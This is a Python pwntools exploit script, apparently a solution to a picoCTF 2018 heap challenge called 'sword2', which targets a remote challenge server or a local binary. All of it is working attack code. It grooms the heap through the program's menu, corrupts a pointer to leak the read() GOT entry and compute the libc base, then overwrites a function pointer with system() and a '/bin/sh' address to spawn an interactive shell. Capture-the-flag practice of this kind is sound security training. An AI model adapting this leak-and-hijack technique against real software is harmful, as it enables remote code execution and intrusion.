#!/usr/bin/python
from struct import *
from pwn import *

debug = 1
if not debug:
    sh = remote('2018shell4.picoctf.com',55713)
else:
    sh = process('./sword2')

LIBC = "/usr/lib/x86_64-linux-gnu/libc.so.6"
libc = ELF(LIBC)
def forgeSword():
    sh.sendlineafter('Quit.\n', '1')

def hardenSword(i, s):
    sh.sendlineafter('Quit.\n', '5')
    sh.sendlineafter('?\n', str(i))
    sh.sendlineafter('?\n', '32')
    sh.sendlineafter('.\n', s)
    sh.sendlineafter('?\n', '-1')

def destroySword(i):
    sh.sendlineafter('Quit.\n', '4')
    sh.sendlineafter('?\n', str(i))

def equipSword(i):
    sh.sendlineafter('Quit.\n', '6')
    sh.sendlineafter('?\n', str(i))

def eightForges():
    for i in range(0,8):
        forgeSword()

def eightDestroys():
    for i in range(0,8):
        destroySword(i)

e = ELF("./sword2")
read_GOT = e.got['read']


s1 = "A"*32
eightForges()
hardenSword(7, s1)

eightDestroys()
eightForges()

s2 = "A"*8
s2 += p64(read_GOT)[:-1]
hardenSword(7, s2)

eightDestroys()
eightForges()


equipSword(7)
ans = (sh.recvuntil('.....')[12:-5].ljust(8, '\x00'))
ans2 = struct.unpack("Q", ans)
read_offset = libc.symbols['read']
libc_base = ans2[0] - read_offset

print hex(libc_base)

binsh = "/bin/sh\x00"

s3 = "A"*32
eightForges()
hardenSword(7, s3)

eightDestroys()
eightForges()
s4 = "A"*8
s4 += p64(next(libc.search(binsh)) + libc_base)
s4 += p64(libc_base + libc.symbols['system'])

hardenSword(7, s4)
eightDestroys()

eightForges()

equipSword(7)
#sh.recvline()
sh.interactive()
#sh.close()

